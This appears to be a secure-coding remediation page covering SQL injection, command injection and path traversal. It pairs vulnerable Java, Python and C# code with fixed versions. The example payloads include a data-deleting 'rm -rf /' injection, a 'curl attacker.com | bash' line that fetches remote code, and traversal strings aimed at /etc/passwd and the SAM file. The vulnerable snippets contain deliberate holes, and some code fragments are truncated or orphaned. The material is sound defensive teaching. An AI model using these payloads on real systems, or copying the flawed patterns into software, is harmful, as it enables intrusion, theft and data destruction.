SQL Injection Vulnerability

SALY-Y689-EXC0-CQLC
Critical

Security Principle Violated: Input Validation and Parameterization

This vulnerability violates the fundamental security principle of treating all user input as untrusted. By directly concatenating user input into SQL queries, the application allows attackers to manipulate the query structure, potentially leading to data breaches, data manipulation, or complete database compromise.

PaymentController.java VULNERABLE 
@GetMapping("/payment/history")
public ResponseEntity<List<Payment>> getPaymentHistory(
        @RequestParam String userId) {

    // VULNERABLE: Direct string concatenation allows SQL injection
    String query = "SELECT * FROM payments WHERE user_id = '" + userId + "'";

    try {
        Statement statement = connection.createStatement();
        ResultSet resultSet = statement.executeQuery(query);

        List<Payment> payments = new ArrayList<>();
        while (resultSet.next()) {
            Payment payment = new Payment();
            payment.setId(resultSet.getLong("id"));
            payment.setAmount(resultSet.getBigDecimal("amount"));
            payment.setDate(resultSet.getTimestamp("payment_date"));
            payments.add(payment);
        }

        return ResponseEntity.ok(payments);
    } catch (SQLException e) {
        return ResponseEntity.status(500).build();
    }
}
PaymentController.java SECURE 
@GetMapping("/payment/history")
public ResponseEntity<List<Payment>> getPaymentHistory(
        @RequestParam String userId) {

    // SECURE: Using parameterized query with PreparedStatement
    String query = "SELECT * FROM payments WHERE user_id = ?";

    try {
        // PreparedStatement prevents SQL injection by treating input as data
        PreparedStatement preparedStatement = connection.prepareStatement(query);
        preparedStatement.setString(1, userId);

        ResultSet resultSet = preparedStatement.executeQuery();

        List<Payment> payments = new ArrayList<>();
        while (resultSet.next()) {
            Payment payment = new Payment();
            payment.setId(resultSet.getLong("id"));
            payment.setAmount(resultSet.getBigDecimal("amount"));
            payment.setDate(resultSet.getTimestamp("payment_date"));
            payments.add(payment);
        }

        return ResponseEntity.ok(payments);
    } catch (SQLException e) {
        // Log error details securely (not exposed to user)
        logger.error("Database error fetching payment history", e);
        return ResponseEntity.status(500).build();
    }
}

Why This Fix Works

The remediated code uses PreparedStatement with parameterized queries, which is the industry-standard approach to preventing SQL injection attacks. Here's why this is secure:

  • Parameter Binding: The ? placeholder separates SQL logic from user data. The database driver automatically escapes and quotes the parameter value.
  • Type Safety: Using setString() ensures the parameter is treated as a string literal, not executable SQL code.
  • Database-Level Protection: PreparedStatements are compiled separately from the data, making it impossible for user input to alter the query structure.
  • Performance Benefits: Prepared statements can be cached and reused, improving performance while maintaining security.

Common Attack Pattern

An attacker could exploit the vulnerable code by submitting: userId = "1' OR '1'='1"

This would transform the query into: SELECT * FROM payments WHERE user_id = '1' OR '1'='1'

The OR condition would always be true, exposing all payment records in the database regardless of user ownership.

OWASP Best Practices

This remediation aligns with OWASP Top 10 - A03:2021 Injection prevention guidelines:

  • Use Parameterized Queries: Always use prepared statements with variable binding for all database interactions.
  • Input Validation: Implement whitelist validation for user input when possible (e.g., validate userId format).
  • Least Privilege: Database accounts should have minimal permissions required for their function.
  • Defense in Depth: Layer multiple security controls including input validation, parameterization, and proper error handling.
  • Error Handling: Never expose detailed database errors to users; log them securely instead.

Command Injection Vulnerability

DXF8-3N0U-UGTV-R74V
Critical

Security Principle Violated: Secure System Command Execution

This vulnerability violates the principle of secure process execution by passing unsanitized user input directly to system shell commands. This allows attackers to inject arbitrary commands, potentially leading to complete system compromise, data exfiltration, or use of the server as a pivot point for further attacks.

app.py VULNERABLE 
@app.route('/backup', methods=['POST'])
def create_backup():
    filename = request.form.get('filename')

    # VULNERABLE: User input directly passed to shell command
    command = f"tar -czf /backups/{filename}.tar.gz /data"

            command,
            shell=True,
            capture_output=True,
            text=True

        if result.returncode == 0:
            return jsonify({
                'status': 'success',
                'message': f'Backup created: {filename}.tar.gz'
            })
        else:
            return jsonify({
                'status': 'error',
                'message': 'Backup failed'
            }), 500

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500
app.py SECURE 
import re
import os
from pathlib import Path

@app.route('/backup', methods=['POST'])
def create_backup():
    filename = request.form.get('filename', '')

    # SECURE: Strict input validation with whitelist approach
    if not filename or not re.match(r'^[a-zA-Z0-9_-]+$', filename):
        return jsonify({
            'status': 'error',
            'message': 'Invalid filename. Use only letters, numbers, dashes, and underscores.'
        }), 400

    # Additional length validation
    if len(filename) > 50:
        return jsonify({
            'status': 'error',
            'message': 'Filename too long. Maximum 50 characters.'
        }), 400

    # Define secure paths
    backup_dir = Path('/backups')
    data_dir = Path('/data')

    # Ensure directories exist and are safe
    if not backup_dir.exists() or not data_dir.exists():
        return jsonify({
            'status': 'error',
            'message': 'System configuration error'
        }), 500

    # Build output path securely
    output_file = backup_dir / f"{filename}.tar.gz"

    try:
        # SECURE: Pass command as list, shell=False prevents injection
        result = subprocess.run(
            [
                'tar',
                '-czf',
                str(output_file),
                str(data_dir)
            ],
            shell=False,  # Critical: Never use shell=True with user input
            capture_output=True,
            text=True,
            timeout=300,  # Prevent DoS via long-running processes
            check=False
        )

        if result.returncode == 0:
            # Verify backup was created successfully
            if output_file.exists():
                return jsonify({
                    'status': 'success',
                    'message': f'Backup created successfully',
                    'filename': f'{filename}.tar.gz'
                })
            else:
                return jsonify({
                    'status': 'error',
                    'message': 'Backup creation verification failed'
                }), 500
        else:
            # Log detailed error for debugging (not exposed to user)
            app.logger.error(f'Backup failed: {result.stderr}')
            return jsonify({
                'status': 'error',
                'message': 'Backup operation failed'
            }), 500

    except subprocess.TimeoutExpired:
        app.logger.error(f'Backup timeout for filename: {filename}')
        return jsonify({
            'status': 'error',
            'message': 'Backup operation timed out'
        }), 500
    except Exception as e:
        app.logger.error(f'Backup exception: {str(e)}')
        return jsonify({
            'status': 'error',
            'message': 'An unexpected error occurred'
        }), 500

Why This Fix Works

The secure implementation uses multiple defense layers to prevent command injection:

  • Whitelist Validation: The regex ^[a-zA-Z0-9_-]+$ allows only safe characters, blocking shell metacharacters like ;, |, &, $, etc.
  • Array-Based Command: Passing the command as a list instead of a string prevents shell interpretation of special characters.
  • shell=False: Disabling shell execution means the subprocess module directly executes the binary without invoking /bin/sh, eliminating shell injection vectors.
  • Path Validation: Using Path objects and validation ensures directory traversal attempts are blocked.
  • Timeout Protection: Prevents resource exhaustion attacks where malicious input could cause infinite loops or excessive processing.
  • Error Handling: Generic error messages to users while detailed errors are logged securely for debugging.

Common Attack Pattern

An attacker could exploit the vulnerable code by submitting: filename = "backup; rm -rf /; echo done"

This would execute multiple commands: create a backup, delete the entire filesystem, then echo "done".

Other dangerous payloads include: $(whoami), `cat /etc/passwd`, backup && curl attacker.com | bash

OWASP Best Practices

This remediation follows OWASP Top 10 - A03:2021 Injection prevention for command injection:

  • Avoid System Commands: When possible, use native programming language functions instead of shelling out.
  • Never Use shell=True: Always use parameterized command execution (array form) without shell invocation.
  • Input Validation: Implement strict whitelist validation using regular expressions that only allow known-safe characters.
  • Use Safe APIs: Prefer language-specific libraries (like Python's shutil) over direct command execution.
  • Principle of Least Privilege: Run processes with minimal required permissions; use dedicated service accounts.
  • Sandboxing: Consider using containers or VMs to isolate command execution environments.

1. Use Native Python Libraries

Replace system commands with native Python functionality when possible:

import shutil
import tarfile

def create_backup_safe(filename):
    # Validate filename (same validation as before)
    if not re.match(r'^[a-zA-Z0-9_-]+$', filename):
        raise ValueError("Invalid filename")

    output_path = f'/backups/{filename}.tar.gz'

Benefits: No shell invocation, better error handling, cross-platform compatibility, easier testing.

2. Predefined Command Templates

Use a whitelist of allowed commands with predefined parameters:

ALLOWED_BACKUP_OPERATIONS = {
    'full': ['/usr/bin/tar', '-czf', '{output}', '/data'],
    'incremental': ['/usr/bin/tar', '-czf', '{output}', '--listed-incremental', '/backups/snapshot.snar', '/data'],
    'config': ['/usr/bin/tar', '-czf', '{output}', '/data/config']
}

def create_backup_templated(backup_type, filename):
    # Validate inputs
    if backup_type not in ALLOWED_BACKUP_OPERATIONS:
        raise ValueError("Invalid backup type")

    if not re.match(r'^[a-zA-Z0-9_-]+$', filename):
        raise ValueError("Invalid filename")

    # Get command template
    command_template = ALLOWED_BACKUP_OPERATIONS[backup_type].copy()

    # Replace output placeholder
    output_path = f'/backups/{filename}.tar.gz'
    command = [arg.format(output=output_path) if '{output}' in arg else arg
               for arg in command_template]

    # Execute with shell=False
    result = subprocess.run(command, shell=False, capture_output=True, timeout=300)
    return result.returncode == 0

Benefits: Supports multiple operations safely, easy to audit, centralized command management.

3VQ2-N6XF-GS7K-MCKF
High

Security Principle Violated: Path Canonicalization and Access Control

This vulnerability violates the principle of secure file system access by failing to properly validate and sanitize file paths. Attackers can use path traversal sequences (like ../) to access files outside the intended directory, potentially reading sensitive system files, configuration files containing credentials, or other users' private data.

Program.cs SECURE 
using System.Text.RegularExpressions;

[HttpGet("download")]
public IActionResult DownloadReport([FromQuery] string filename)
{
    // SECURE: Comprehensive input validation and path canonicalization

    // Step 1: Reject null or empty filenames
    if (string.IsNullOrWhiteSpace(filename))
    {
        _logger.LogWarning("Download attempt with empty filename from {IP}",
            HttpContext.Connection.RemoteIpAddress);
        return BadRequest(new { error = "Filename is required" });
    }

    // Step 2: Whitelist validation - only allow safe characters
    var safeFilenamePattern = @"^[a-zA-Z0-9_\-\.]+$";
    if (!Regex.IsMatch(filename, safeFilenamePattern))
    {
        _logger.LogWarning("Download attempt with invalid filename: {Filename} from {IP}",
            filename, HttpContext.Connection.RemoteIpAddress);
        return BadRequest(new { error = "Invalid filename format" });
    }

    // Step 3: Reject any path traversal attempts
    if (filename.Contains("..") || filename.Contains("/") || filename.Contains("\\"))
    {
        _logger.LogWarning("Path traversal attempt detected: {Filename} from {IP}",
            filename, HttpContext.Connection.RemoteIpAddress);
        return BadRequest(new { error = "Invalid filename" });
    }

    // Step 4: Length validation
    if (filename.Length > 255)
    {
        return BadRequest(new { error = "Filename too long" });
    }

    // Step 5: Build and canonicalize paths
    var reportsPath = Path.Combine(_hostingEnvironment.ContentRootPath, "reports");
    var requestedFilePath = Path.Combine(reportsPath, filename);

    // Step 6: Canonicalize both paths (resolve symlinks, relative paths, etc.)
    string canonicalBasePath;
    string canonicalRequestedPath;

    try
    {
        canonicalBasePath = Path.GetFullPath(reportsPath);
        canonicalRequestedPath = Path.GetFullPath(requestedFilePath);
    }
    catch (Exception ex)
    {
        _logger.LogError(ex, "Path canonicalization failed for {Filename}", filename);
        return BadRequest(new { error = "Invalid file path" });
    }

    // Step 7: Ensure requested path is within allowed directory
    if (!canonicalRequestedPath.StartsWith(canonicalBasePath + Path.DirectorySeparatorChar) &&
        !canonicalRequestedPath.Equals(canonicalBasePath))
    {
        _logger.LogWarning("Directory traversal blocked: {RequestedPath} not in {BasePath} from {IP}",
            canonicalRequestedPath, canonicalBasePath, HttpContext.Connection.RemoteIpAddress);
        return BadRequest(new { error = "Access denied" });
    }

    // Step 8: Verify file exists
    if (!System.IO.File.Exists(canonicalRequestedPath))
    {
        return NotFound(new { error = "File not found" });
    }

    // Step 9: Optional - Verify file extension whitelist
    var allowedExtensions = new[] { ".pdf", ".xlsx", ".csv", ".txt" };
    var fileExtension = Path.GetExtension(canonicalRequestedPath).ToLowerInvariant();

    if (!allowedExtensions.Contains(fileExtension))
    {
        _logger.LogWarning("Disallowed file extension requested: {Extension} for {Filename}",
            fileExtension, filename);
        return BadRequest(new { error = "File type not allowed" });
    }

    try
    {
        // Step 10: Read file with size limit check
        var fileInfo = new FileInfo(canonicalRequestedPath);
        const long maxFileSize = 100 * 1024 * 1024; // 100 MB limit

        if (fileInfo.Length > maxFileSize)
        {
            _logger.LogWarning("Large file download attempt: {Size} bytes for {Filename}",
                fileInfo.Length, filename);
            return BadRequest(new { error = "File too large" });
        }

        // Read and return file securely
        var fileBytes = System.IO.File.ReadAllBytes(canonicalRequestedPath);

        // Set proper content type based on extension
        var contentType = fileExtension switch
        {
            ".pdf" => "application/pdf",
            ".xlsx" => "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            ".csv" => "text/csv",
            ".txt" => "text/plain",
            _ => "application/octet-stream"
        };

        // Log successful download
        _logger.LogInformation("File downloaded: {Filename} by {IP}",
            filename, HttpContext.Connection.RemoteIpAddress);

        // Return file with proper security headers
        Response.Headers.Add("X-Content-Type-Options", "nosniff");
        Response.Headers.Add("Content-Security-Policy", "default-src 'none'");

        return File(fileBytes, contentType, Path.GetFileName(canonicalRequestedPath));
    }
    catch (UnauthorizedAccessException)
    {
        _logger.LogError("Unauthorized file access attempt: {Path}", canonicalRequestedPath);
        return StatusCode(403, new { error = "Access denied" });
    }
    catch (Exception ex)
    {
        _logger.LogError(ex, "Error downloading file: {Filename}", filename);
        return StatusCode(500, new { error = "An error occurred while processing your request" });
    }
}

Why This Fix Works

The secure implementation employs defense-in-depth with multiple validation layers:

  • Whitelist Validation: Only allows alphanumeric characters, dashes, underscores, and dots, blocking all path traversal sequences.
  • Explicit Traversal Blocking: Specifically checks for .., /, and \ characters that could enable directory traversal.
  • Path Canonicalization: Path.GetFullPath() resolves all relative paths, symlinks, and shortcuts to absolute canonical paths.
  • Prefix Validation: Verifies the canonical requested path starts with the canonical base directory, preventing escapes via symlinks or other tricks.
  • Extension Whitelist: Only allows specific file types, preventing access to system files or executables.
  • Size Limits: Prevents denial-of-service attacks via excessive file sizes.
  • Security Logging: All suspicious attempts are logged with IP addresses for security monitoring and incident response.

Common Attack Patterns

Attackers could exploit the vulnerable code using various techniques:

Simple traversal: filename=../../../../etc/passwd (access system password file)

URL encoding: filename=..%2F..%2F..%2Fetc%2Fpasswd (bypass basic filters)

Double encoding: filename=..%252F..%252F..%252Fetc%252Fpasswd (bypass multiple decode layers)

Mixed separators: filename=..\../..\../etc/passwd (Windows/Linux mixed)

Absolute paths: filename=/etc/passwd or filename=C:\Windows\System32\config\SAM

OWASP Best Practices

This remediation implements OWASP Top 10 - A01:2021 Broken Access Control prevention strategies:

  • Input Validation: Use strict whitelist validation accepting only known-safe characters for filenames.
  • Path Canonicalization: Always canonicalize paths before security checks to prevent bypasses via symlinks or relative paths.
  • Jail/Chroot Pattern: Ensure all file operations occur within a restricted directory tree.
  • Defense in Depth: Layer multiple checks (whitelist, traversal detection, canonicalization, prefix validation).
  • Principle of Least Privilege: Application should run with minimal file system permissions.
  • Security Logging: Log and monitor all file access attempts, especially failures and suspicious patterns.
  • Content Type Headers: Use proper Content-Type and security headers to prevent content sniffing attacks.

    {
        return Forbid();
    }

    // Get blob client
    var blobClient = _blobContainerClient.GetBlobClient($"reports/{reportId}.pdf");

    // Check if blob exists
    if (!await blobClient.ExistsAsync())
    {
        return NotFound();
    }

    // Generate SAS token with short expiration
    var sasBuilder = new BlobSasBuilder
    {
        BlobContainerName = "reports",
        BlobName = $"reports/{reportId}.pdf",
        Resource = "b",
        ExpiresOn = DateTimeOffset.UtcNow.AddMinutes(5), // Short-lived
        Protocol = SasProtocol.Https
    };

    sasBuilder.SetPermissions(BlobSasPermissions.Read);

    // Generate signed URL
    var sasUri = blobClient.GenerateSasUri(sasBuilder);

    // Log access
    _logger.LogInformation("Generated download URL for report {ReportId} for user {User}",
        reportId, User.Identity.Name);

    // Return temporary URL to client
    return Ok(new { downloadUrl = sasUri.ToString() });
}

Benefits: Scalable, temporary access, offloads bandwidth, built-in security features, automatic CDN integration.

    // Configure request size limits

    });
